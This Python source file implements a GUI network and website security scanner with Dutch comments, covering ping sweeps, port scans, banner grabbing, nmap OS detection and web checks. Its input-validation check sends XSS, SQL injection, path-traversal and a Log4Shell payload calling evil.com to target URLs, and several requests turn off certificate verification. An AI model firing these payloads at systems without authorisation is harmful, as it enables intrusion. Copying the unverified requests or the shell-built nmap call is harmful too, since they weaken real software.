import socket
import ipaddress
import platform
import subprocess
from datetime import datetime
import threading
import requests
import customtkinter as ctk
from utils import log_message
import whois
import json
import re
from urllib.parse import urlparse
import ssl
import urllib3
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Onderdruk SSL waarschuwingen
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class NetworkScanner:
    def __init__(self, app):
        self.app = app
        self.scanning = False
        # Configureer requests session met SSL verificatie
        self.session = requests.Session()
        self.session.verify = True  # Enable SSL verificatie
        
    def create_warning_frame(self):
        """Maak het waarschuwingsframe met sluit-knop"""
        self.warning_frame = ctk.CTkFrame(self.app.main_frame)
        self.warning_frame.grid(row=0, column=0, columnspan=3, padx=20, pady=(10, 5), sticky="ew")
        
        # Header frame met waarschuwing en sluit-knop
        header_frame = ctk.CTkFrame(self.warning_frame, fg_color="transparent")
        header_frame.pack(fill="x", pady=5, padx=10)
        
        # Waarschuwing header met icoon (links)
        warning_header = ctk.CTkFrame(header_frame, fg_color="transparent")
        warning_header.pack(side="left")
        
        warning_icon = ctk.CTkLabel(
            warning_header,
            text="⚠️",
            font=("Arial", 24),
            text_color="#FFB302"
        )
        warning_icon.pack(side="left", padx=(0, 10))
        
        warning_title = ctk.CTkLabel(
            warning_header,
            text="WETTELIJKE WAARSCHUWING",
            font=("Arial", 16, "bold"),
            text_color="#FFB302"
        )
        warning_title.pack(side="left")
        
        # Sluit-knop (rechts)
        close_button = ctk.CTkButton(
            header_frame,
            text="✕",
            width=30,
            height=30,
            fg_color="transparent",
            hover_color="#FF6B6B",
            command=self.hide_warning
        )
        close_button.pack(side="right", padx=5)
        
        # Waarschuwing tekst
        warning_text = ctk.CTkLabel(
            self.warning_frame,
            text="Het is illegaal om netwerk scans uit te voeren op systemen zonder expliciete toestemming.\n"
                 "Gebruik deze tool alleen op netwerken waarvoor u toestemming heeft.",
            font=("Arial", 12),
            text_color="#FF6B6B"
        )
        warning_text.pack(pady=(0, 10), padx=20)

    def hide_warning(self):
        """Verberg het waarschuwingsframe"""
        self.warning_frame.grid_remove()
        # Verschuif andere frames omhoog
        self.scanner_frame.grid(row=0, column=0, columnspan=3, padx=20, pady=10, sticky="ew")
        if hasattr(self, 'progress_frame'):
            self.progress_frame.grid(row=1, column=0, columnspan=3, padx=20, pady=10, sticky="ew")

    def setup_progress_frame(self):
        """Setup progress frame"""
        self.progress_frame = ctk.CTkFrame(self.app.main_frame)
        self.progress_frame.grid(row=2, column=0, columnspan=3, padx=20, pady=10, sticky="ew")
        self.progress_frame.grid_columnconfigure(0, weight=1)

        self.progress_bar = ctk.CTkProgressBar(
            self.progress_frame,
            width=300,
            height=20,
            border_width=2,
            progress_color="#00ff00",
            fg_color="#000000"
        )
        self.progress_bar.grid(row=0, column=0, padx=10, pady=5, sticky="ew")
        self.progress_bar.set(0)

        self.percentage_label = ctk.CTkLabel(
            self.progress_frame,
            text="0%",
            font=("Terminal", 12),
            text_color="#00ff00"
        )
        self.percentage_label.grid(row=1, column=0, pady=2)

        self.status_label = ctk.CTkLabel(
            self.progress_frame,
            text="",
            font=("Terminal", 10),
            text_color="#00ff00"
        )
        self.status_label.grid(row=2, column=0, pady=2)
        
        # Verberg progress frame initieel
        self.progress_frame.grid_remove()

    def setup_ui(self):
        """Setup de UI voor de Network Scanner"""
        for widget in self.app.main_frame.winfo_children():
            if widget != self.app.output_text:
                widget.destroy()

        # Waarschuwing frame
        self.create_warning_frame()

        # Scanner frame
        self.scanner_frame = ctk.CTkFrame(self.app.main_frame)
        self.scanner_frame.grid(row=1, column=0, columnspan=3, padx=20, pady=10, sticky="ew")

        # Network range input
        network_label = ctk.CTkLabel(self.scanner_frame, text="Netwerk Range:")
        network_label.grid(row=0, column=0, padx=5, pady=5)

        self.network_entry = ctk.CTkEntry(self.scanner_frame, width=200)
        self.network_entry.grid(row=0, column=1, padx=5, pady=5)
        self.network_entry.insert(0, "Enter network range (e.g. 192.168.1.0/24)...")

        # Scan opties
        options_frame = ctk.CTkFrame(self.scanner_frame)
        options_frame.grid(row=1, column=0, columnspan=4, padx=5, pady=5, sticky="ew")

        self.hostname_check = ctk.CTkCheckBox(
            options_frame,
            text="Hostname Detection",
            variable=ctk.BooleanVar(value=True)
        )
        self.hostname_check.grid(row=0, column=0, padx=5, pady=5)

        self.os_check = ctk.CTkCheckBox(
            options_frame,
            text="OS Detection",
            variable=ctk.BooleanVar(value=True)
        )
        self.os_check.grid(row=0, column=1, padx=5, pady=5)

        self.vendor_check = ctk.CTkCheckBox(
            options_frame,
            text="Vendor Detection",
            variable=ctk.BooleanVar(value=True)
        )
        self.vendor_check.grid(row=0, column=2, padx=5, pady=5)

        # Start scan button
        self.scan_button = ctk.CTkButton(
            self.scanner_frame,
            text="Start Network Scan",
            command=self.start_scan,
            fg_color="#1f538d"
        )
        self.scan_button.grid(row=2, column=0, columnspan=4, padx=5, pady=10)

        # Progress frame
        self.setup_progress_frame()

    def start_scan(self):
        """Start netwerk scan"""
        network = self.network_entry.get()
        self.scanning = True
        
        try:
            # Verberg waarschuwing
            if hasattr(self, 'warning_frame'):
                self.warning_frame.grid_remove()
            
            # Reset en toon output
            self.app.output_text.delete("1.0", "end")
            log_message(self.app.output_text, "Starting Network Scan...", "header")
            log_message(self.app.output_text, f"Network Range: {network}\n", "info")
            
            # Verschuif scanner frame naar boven
            self.scanner_frame.grid(row=0, column=0, columnspan=3, padx=20, pady=10, sticky="ew")
            
            # Toon progress
            self.progress_bar.set(0)
            self.percentage_label.configure(text="0%")
            self.status_label.configure(text="Initializing scan...")
            self.progress_frame.grid(row=1)  # Update row positie
            
            # Update button
            self.scan_button.configure(text="Stop Scan", command=self.stop_scan)
            
            # Start scan thread
            thread = threading.Thread(target=self._run_network_scan, args=(network,))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"Error starting scan: {str(e)}")
            self.scan_completed()

    def _run_network_scan(self, network):
        """Voer netwerk scan uit"""
        try:
            # Parse network range
            network = ipaddress.ip_network(network)
            total_hosts = len(list(network.hosts()))
            found_devices = []
            
            log_message(self.app.output_text, f"Scanning {total_hosts} potential hosts...\n", "info")
            
            for i, ip in enumerate(network.hosts()):
                if not self.scanning:
                    break
                    
                ip = str(ip)
                self.update_progress((i + 1) / total_hosts, f"Scanning {ip}...")
                
                # Check if host is up
                if self._is_host_up(ip):
                    device_info = self._get_device_info(ip)
                    found_devices.append(device_info)
                    
                    # Log device info
                    log_message(self.app.output_text, f"\n[+] Device found: {ip}", "success")
                    if device_info['hostname']:
                        log_message(self.app.output_text, f"  Hostname: {device_info['hostname']}", "info")
                    if device_info['os']:
                        log_message(self.app.output_text, f"  OS: {device_info['os']}", "info")
                    if device_info['vendor']:
                        log_message(self.app.output_text, f"  Vendor: {device_info['vendor']}", "info")
                    if device_info['open_ports']:
                        log_message(self.app.output_text, f"  Open ports: {', '.join(map(str, device_info['open_ports']))}", "info")
            
            # Generate summary
            self._generate_network_report(found_devices)
            
        except Exception as e:
            log_message(self.app.output_text, f"Scan error: {str(e)}", "error")
        finally:
            self.scan_completed()

    def _is_host_up(self, ip):
        """Check of host online is"""
        try:
            # Gebruik verschillende methoden afhankelijk van OS
            if platform.system().lower() == "windows":
                ping_cmd = ['ping', '-n', '1', '-w', '1000', ip]
            else:
                ping_cmd = ['ping', '-c', '1', '-W', '1', ip]
                
            return subprocess.call(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
        except:
            return False

    def _get_device_info(self, ip):
        """Verzamel uitgebreide informatie over apparaat"""
        device_info = {
            'ip': ip,
            'hostname': '',
            'os': '',
            'vendor': '',
            'open_ports': [],
            'geo_location': {},
            'whois_info': {},
            'reverse_dns': '',
            'isp': '',
            'network_info': {},
            'security_info': {},
            'services': []
        }
        
        # Basis informatie
        if self.hostname_check.get():
            try:
                device_info['hostname'] = socket.gethostbyaddr(ip)[0]
                device_info['reverse_dns'] = socket.gethostbyaddr(ip)[0]
            except:
                pass

        # Geo-locatie informatie via ip-api.com
        try:
            geo_response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            if geo_response.status_code == 200:
                geo_data = geo_response.json()
                device_info['geo_location'] = {
                    'country': geo_data.get('country', ''),
                    'city': geo_data.get('city', ''),
                    'region': geo_data.get('regionName', ''),
                    'lat': geo_data.get('lat', ''),
                    'lon': geo_data.get('lon', ''),
                    'timezone': geo_data.get('timezone', '')
                }
                device_info['isp'] = geo_data.get('isp', '')
        except:
            pass

        # WHOIS informatie
        try:
            whois_info = whois.whois(ip)
            if whois_info:
                device_info['whois_info'] = {
                    'registrar': whois_info.registrar,
                    'creation_date': whois_info.creation_date,
                    'expiration_date': whois_info.expiration_date,
                    'name_servers': whois_info.name_servers,
                    'org': whois_info.org
                }
        except:
            pass

        # Netwerk informatie via portscan
        common_ports = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            443: 'HTTPS',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            8080: 'HTTP-Proxy'
        }
        
        for port, service_name in common_ports.items():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(0.5)
                    if sock.connect_ex((ip, port)) == 0:
                        device_info['open_ports'].append(port)
                        # Probeer banner grabbing
                        try:
                            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                            banner = sock.recv(1024).decode('utf-8', errors='ignore')
                            device_info['services'].append({
                                'port': port,
                                'service': service_name,
                                'banner': banner.strip()
                            })
                        except:
                            device_info['services'].append({
                                'port': port,
                                'service': service_name,
                                'banner': ''
                            })
            except:
                continue

        # OS detectie met verbeterde methode
        if self.os_check.get():
            try:
                if platform.system().lower() == "windows":
                    cmd = f'ping -a {ip}'
                else:
                    cmd = f'nmap -O {ip}'
                result = subprocess.check_output(cmd, shell=True).decode()
                
                # Verbeterde OS detectie
                os_markers = {
                    'Windows': ['Windows', 'Microsoft'],
                    'Linux': ['Linux', 'Ubuntu', 'Debian', 'CentOS', 'Red Hat'],
                    'macOS': ['Mac OS', 'Darwin'],
                    'FreeBSD': ['FreeBSD'],
                    'Android': ['Android']
                }
                
                for os_name, markers in os_markers.items():
                    if any(marker in result for marker in markers):
                        device_info['os'] = os_name
                        break
            except:
                pass

        # Security informatie
        device_info['security_info'] = self._check_security(ip, device_info['open_ports'])

        return device_info

    def _check_security(self, ip, open_ports):
        """Controleer security aspecten van het apparaat"""
        security_info = {
            'vulnerabilities': [],
            'warnings': [],
            'recommendations': []
        }

        # Check voor onveilige services
        if 21 in open_ports:
            security_info['vulnerabilities'].append('FTP service gevonden (onversleuteld)')
        if 23 in open_ports:
            security_info['vulnerabilities'].append('Telnet service gevonden (onveilig)')
        if 80 in open_ports and 443 not in open_ports:
            security_info['warnings'].append('HTTP zonder HTTPS gevonden')

        # Check voor database ports
        db_ports = {3306: 'MySQL', 5432: 'PostgreSQL', 1433: 'MSSQL'}
        for port, db in db_ports.items():
            if port in open_ports:
                security_info['warnings'].append(f'{db} direct toegankelijk van buitenaf')

        # Remote access checks
        remote_ports = {22: 'SSH', 3389: 'RDP', 5900: 'VNC'}
        for port, service in remote_ports.items():
            if port in open_ports:
                security_info['warnings'].append(f'{service} remote access gevonden')

        return security_info

    def _generate_network_report(self, devices):
        """Genereer uitgebreid netwerk rapport"""
        log_message(self.app.output_text, "\n" + "="*50, "header")
        log_message(self.app.output_text, " NETWORK SCAN SUMMARY ", "header")
        log_message(self.app.output_text, "="*50 + "\n", "header")
        
        log_message(self.app.output_text, f"Total devices found: {len(devices)}", "info")
        
        # Detailed device information
        for device in devices:
            log_message(self.app.output_text, f"\n[+] Device: {device['ip']}", "success")
            
            if device['hostname']:
                log_message(self.app.output_text, f"  Hostname: {device['hostname']}", "info")
            if device['reverse_dns']:
                log_message(self.app.output_text, f"  Reverse DNS: {device['reverse_dns']}", "info")
            if device['os']:
                log_message(self.app.output_text, f"  Operating System: {device['os']}", "info")
            
            # Geo-location info
            if device['geo_location']:
                log_message(self.app.output_text, "\n  Geographic Location:", "header")
                for key, value in device['geo_location'].items():
                    if value:
                        log_message(self.app.output_text, f"    {key.title()}: {value}", "info")
            
            # Network services
            if device['services']:
                log_message(self.app.output_text, "\n  Active Services:", "header")
                for service in device['services']:
                    service_info = f"    Port {service['port']} - {service['service']}"
                    if service['banner']:
                        service_info += f" ({service['banner']})"
                    log_message(self.app.output_text, service_info, "info")
            
            # WHOIS information
            if device['whois_info']:
                log_message(self.app.output_text, "\n  WHOIS Information:", "header")
                for key, value in device['whois_info'].items():
                    if value:
                        log_message(self.app.output_text, f"    {key.title()}: {value}", "info")
            
            # Security information
            if device['security_info']:
                log_message(self.app.output_text, "\n  Security Analysis:", "header")
                if device['security_info']['vulnerabilities']:
                    log_message(self.app.output_text, "    Vulnerabilities:", "error")
                    for vuln in device['security_info']['vulnerabilities']:
                        log_message(self.app.output_text, f"      • {vuln}", "error")
                if device['security_info']['warnings']:
                    log_message(self.app.output_text, "    Warnings:", "warning")
                    for warning in device['security_info']['warnings']:
                        log_message(self.app.output_text, f"      • {warning}", "warning")
        
        # Network statistics
        self._generate_statistics(devices)

    def _generate_statistics(self, devices):
        """Genereer netwerk statistieken"""
        log_message(self.app.output_text, "\n" + "="*50, "header")
        log_message(self.app.output_text, " NETWORK STATISTICS ", "header")
        log_message(self.app.output_text, "="*50 + "\n", "header")

        # OS Distribution
        os_stats = {}
        for device in devices:
            if device['os']:
                os_stats[device['os']] = os_stats.get(device['os'], 0) + 1

        if os_stats:
            log_message(self.app.output_text, "Operating System Distribution:", "header")
            for os, count in os_stats.items():
                percentage = (count / len(devices)) * 100
                log_message(self.app.output_text, f"  {os}: {count} devices ({percentage:.1f}%)", "info")

        # Geographic Distribution
        geo_stats = {}
        for device in devices:
            if device['geo_location'].get('country'):
                country = device['geo_location']['country']
                geo_stats[country] = geo_stats.get(country, 0) + 1

        if geo_stats:
            log_message(self.app.output_text, "\nGeographic Distribution:", "header")
            for country, count in geo_stats.items():
                percentage = (count / len(devices)) * 100
                log_message(self.app.output_text, f"  {country}: {count} devices ({percentage:.1f}%)", "info")

        # Service Statistics
        service_stats = {}
        for device in devices:
            for service in device['services']:
                service_name = service['service']
                service_stats[service_name] = service_stats.get(service_name, 0) + 1

        if service_stats:
            log_message(self.app.output_text, "\nService Distribution:", "header")
            for service, count in service_stats.items():
                percentage = (count / len(devices)) * 100
                log_message(self.app.output_text, f"  {service}: {count} instances ({percentage:.1f}%)", "info")

        # Security Statistics
        vuln_count = sum(len(d['security_info']['vulnerabilities']) for d in devices)
        warning_count = sum(len(d['security_info']['warnings']) for d in devices)
        
        log_message(self.app.output_text, "\nSecurity Overview:", "header")
        log_message(self.app.output_text, f"  Total Vulnerabilities: {vuln_count}", "error")
        log_message(self.app.output_text, f"  Total Warnings: {warning_count}", "warning")

    def update_progress(self, progress_value, status_text):
        """Update progress bar"""
        if not self.progress_bar.winfo_exists():
            return
            
        try:
            self.progress_bar.set(progress_value)
            percentage = int(progress_value * 100)
            self.percentage_label.configure(text=f"{percentage}%")
            self.status_label.configure(text=status_text)
        except Exception as e:
            print(f"Error updating progress: {str(e)}")

    def scan_completed(self):
        """Reset UI na scan"""
        if not hasattr(self, 'scan_button') or not self.scan_button.winfo_exists():
            return
            
        try:
            self.scanning = False
            self.scan_button.configure(text="Start Network Scan", command=self.start_scan, state="normal")
            if hasattr(self, 'progress_frame') and self.progress_frame.winfo_exists():
                self.progress_frame.grid_remove()
            self.update_progress(0, "")
        except Exception as e:
            print(f"Error in scan completion: {str(e)}")

    def stop_scan(self):
        """Stop de netwerk scan"""
        self.scanning = False
        self.scan_button.configure(state="disabled")
        self.status_label.configure(text="STOPPING SCAN...")
        log_message(self.app.output_text, "\nStopping network scan...", "warning")

    def start_web_scan(self):
        """Start website scan"""
        url = self.web_entry.get()
        self.scanning = True
        
        try:
            # Verberg waarschuwing
            if hasattr(self, 'warning_frame'):
                self.warning_frame.grid_remove()
            
            # Reset en toon output
            self.app.output_text.delete("1.0", "end")
            log_message(self.app.output_text, "Starting Website Security Scan...", "header")
            log_message(self.app.output_text, f"Target URL: {url}\n", "info")
            
            # Verschuif scanner frame naar boven
            self.scanner_frame.grid(row=0, column=0, columnspan=3, padx=20, pady=10, sticky="ew")
            
            # Toon progress
            self.progress_bar.set(0)
            self.percentage_label.configure(text="0%")
            self.status_label.configure(text="Initializing scan...")
            self.progress_frame.grid(row=1)  # Update row positie
            
            # Update buttons
            self.web_scan_button.configure(text="Stop Scan", command=self.stop_web_scan)
            self.scan_button.configure(state="disabled")
            
            # Start scan thread
            thread = threading.Thread(target=self._run_web_scan, args=(url,))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"Error starting web scan: {str(e)}")
            self.scan_completed()

    def _run_web_scan(self, url):
        """Voer website security scan uit"""
        try:
            security_issues = []
            
            # Basic HTTP headers check
            headers = self._check_security_headers(url)
            security_issues.extend(headers)
            
            # SSL/TLS check
            ssl_issues = self._check_ssl_security(url)
            security_issues.extend(ssl_issues)
            
            # Content security check
            content_issues = self._check_content_security(url)
            security_issues.extend(content_issues)
            
            # Input validation check
            input_issues = self._check_input_validation(url)
            security_issues.extend(input_issues)
            
            # Authentication check
            auth_issues = self._check_authentication(url)
            security_issues.extend(auth_issues)
            
            # Generate report
            self._generate_web_security_report(url, security_issues)
            
        except Exception as e:
            log_message(self.app.output_text, f"Error scanning website: {str(e)}", "error")

    def _check_security_headers(self, url):
        """Check security headers"""
        issues = []
        try:
            # Gebruik session met SSL verificatie
            response = self.session.get(url, timeout=10)
            headers = response.headers
            
            # Essential security headers
            security_headers = {
                'Strict-Transport-Security': 'HSTS niet geconfigureerd - kwetsbaar voor MITM attacks',
                'Content-Security-Policy': 'CSP ontbreekt - kwetsbaar voor XSS attacks',
                'X-Frame-Options': 'X-Frame-Options ontbreekt - kwetsbaar voor clickjacking',
                'X-Content-Type-Options': 'X-Content-Type-Options ontbreekt - kwetsbaar voor MIME-sniffing',
                'X-XSS-Protection': 'X-XSS-Protection ontbreekt - verminderde XSS bescherming',
                'Referrer-Policy': 'Referrer-Policy ontbreekt - mogelijk information leakage'
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    issues.append({
                        'type': 'header',
                        'severity': 'medium',
                        'description': message,
                        'recommendation': f'Implementeer de {header} header'
                    })
            
            # Server versie check
            if 'Server' in headers:
                issues.append({
                    'type': 'header',
                    'severity': 'low',
                    'description': f'Server versie zichtbaar: {headers["Server"]}',
                    'recommendation': 'Verberg server versie informatie'
                })
                
        except requests.exceptions.SSLError:
            issues.append({
                'type': 'ssl',
                'severity': 'high', 
                'description': 'SSL certificaat verificatie mislukt',
                'recommendation': 'Controleer SSL certificaat configuratie'
            })
        except Exception as e:
            issues.append({
                'type': 'connection',
                'severity': 'medium',
                'description': f'Verbindingsfout: {str(e)}',
                'recommendation': 'Controleer netwerk connectiviteit'
            })
            
        return issues

    def _check_ssl_security(self, url):
        """Check SSL/TLS security"""
        issues = []
        try:
            parsed_url = urlparse(url)
            hostname = parsed_url.hostname
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificaat verloopdatum
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    if not_after < datetime.now():
                        issues.append({
                            'type': 'ssl',
                            'severity': 'critical',
                            'description': 'SSL certificaat is verlopen',
                            'recommendation': 'Vernieuw het SSL certificaat'
                        })
                    
                    # Check zwakke cipher suites
                    cipher = ssock.cipher()
                    if cipher[0] in ['DES', '3DES', 'RC4']:
                        issues.append({
                            'type': 'ssl',
                            'severity': 'high',
                            'description': f'Zwakke cipher suite in gebruik: {cipher[0]}',
                            'recommendation': 'Configureer alleen sterke cipher suites'
                        })
                    
        except ssl.SSLError as e:
            issues.append({
                'type': 'ssl',
                'severity': 'critical',
                'description': f'SSL Error: {str(e)}',
                'recommendation': 'Controleer SSL configuratie'
            })
            
        return issues

    def _check_content_security(self, url):
        """Check website content security"""
        issues = []
        try:
            response = requests.get(url, verify=False, timeout=10)
            content = response.text.lower()
            
            # Check voor gevoelige informatie in HTML comments
            comments = re.findall('<!--(.*)-->', content)
            if comments:
                issues.append({
                    'type': 'content',
                    'severity': 'medium',
                    'description': 'Gevoelige informatie gevonden in HTML comments',
                    'recommendation': 'Verwijder gevoelige comments uit productie code'
                })
            
            # Check voor exposed version numbers
            version_patterns = [
                r'version\s*[=:]\s*["\']?\d+\.\d+',
                r'v\d+\.\d+\.\d+',
                r'@version\s+\d+'
            ]
            for pattern in version_patterns:
                if re.search(pattern, content):
                    issues.append({
                        'type': 'content',
                        'severity': 'low',
                        'description': 'Software versie informatie zichtbaar',
                        'recommendation': 'Verberg versie informatie in productie'
                    })
                    break
            
            # Check voor debug/error informatie
            error_patterns = [
                'stack trace',
                'debug',
                'error in',
                'exception',
                'failed to'
            ]
            for pattern in error_patterns:
                if pattern in content:
                    issues.append({
                        'type': 'content',
                        'severity': 'medium',
                        'description': 'Debug/error informatie zichtbaar',
                        'recommendation': 'Schakel debug mode uit in productie'
                    })
                    break
                    
        except Exception as e:
            issues.append({
                'type': 'content',
                'severity': 'medium',
                'description': f'Content analyse fout: {str(e)}',
                'recommendation': 'Controleer website bereikbaarheid'
            })
            
        return issues

    def _check_input_validation(self, url):
        """Check voor input validation vulnerabilities"""
        issues = []
        try:
            # Test XSS vulnerabilities
            test_payloads = [
                '<script>alert(1)</script>',
                '"><script>alert(1)</script>',
                '1\' OR \'1\'=\'1',
                '../../../etc/passwd',
                '${jndi:ldap://evil.com/x}'
            ]
            
            for payload in test_payloads:
                test_url = f"{url}?q={payload}"
                response = requests.get(test_url, verify=False, timeout=5)
                
                if payload in response.text:
                    issues.append({
                        'type': 'input',
                        'severity': 'high',
                        'description': f'Mogelijk XSS/Injection vulnerability gevonden met payload: {payload}',
                        'recommendation': 'Implementeer proper input validation en encoding'
                    })
                    
        except Exception as e:
            issues.append({
                'type': 'input',
                'severity': 'medium',
                'description': f'Input validation test fout: {str(e)}',
                'recommendation': 'Controleer website bereikbaarheid'
            })
            
        return issues

    def _check_authentication(self, url):
        """Check authentication security"""
        issues = []
        try:
            # Check login form security
            response = requests.get(url, verify=False, timeout=10)
            content = response.text.lower()
            
            # Check voor basic auth
            if 'authorization: basic' in str(response.request.headers).lower():
                issues.append({
                    'type': 'auth',
                    'severity': 'high',
                    'description': 'Basic authentication in gebruik',
                    'recommendation': 'Gebruik een veiligere authenticatie methode'
                })
            
            # Check voor login form zonder HTTPS
            if 'password' in content and not url.startswith('https'):
                issues.append({
                    'type': 'auth',
                    'severity': 'critical',
                    'description': 'Login form zonder HTTPS',
                    'recommendation': 'Gebruik HTTPS voor alle authenticatie'
                })
            
            # Check voor remember me functionality
            if 'remember me' in content or 'keep me logged in' in content:
                issues.append({
                    'type': 'auth',
                    'severity': 'low',
                    'description': 'Remember me functionaliteit gevonden',
                    'recommendation': 'Zorg voor veilige implementatie van persistent auth'
                })
                
        except Exception as e:
            issues.append({
                'type': 'auth',
                'severity': 'medium',
                'description': f'Authentication check fout: {str(e)}',
                'recommendation': 'Controleer website bereikbaarheid'
            })
            
        return issues

    def _generate_web_security_report(self, url, issues):
        """Genereer web security rapport"""
        log_message(self.app.output_text, "\nWeb Security Report\n", "header")
        log_message(self.app.output_text, f"Target URL: {url}\n", "info")
        
        # Groepeer issues op severity
        severity_groups = {
            'critical': [],
            'high': [],
            'medium': [],
            'low': []
        }
        
        for issue in issues:
            severity_groups[issue['severity']].append(issue)
        
        # Print issues gesorteerd op severity
        for severity in ['critical', 'high', 'medium', 'low']:
            if severity_groups[severity]:
                log_message(self.app.output_text, f"\n{severity.upper()} Risk Issues:", "header")
                for issue in severity_groups[severity]:
                    log_message(self.app.output_text, f"\n• Type: {issue['type']}", "error" if severity in ['critical', 'high'] else "warning")
                    log_message(self.app.output_text, f"  Description: {issue['description']}", "info")
                    log_message(self.app.output_text, f"  Recommendation: {issue['recommendation']}", "info")
        
        # Summary
        log_message(self.app.output_text, "\nSummary:", "header")
        for severity in severity_groups:
            count = len(severity_groups[severity])
            if count > 0:
                color = "error" if severity in ['critical', 'high'] else "warning" if severity == 'medium' else "info"
                log_message(self.app.output_text, f"  {severity.upper()}: {count} issues", color)

    def stop_web_scan(self):
        """Stop de website scan"""
        self.scanning = False
        self.web_scan_button.configure(state="disabled")
        self.status_label.configure(text="STOPPING SCAN...")
        log_message(self.app.output_text, "\nStopping website scan...", "warning") 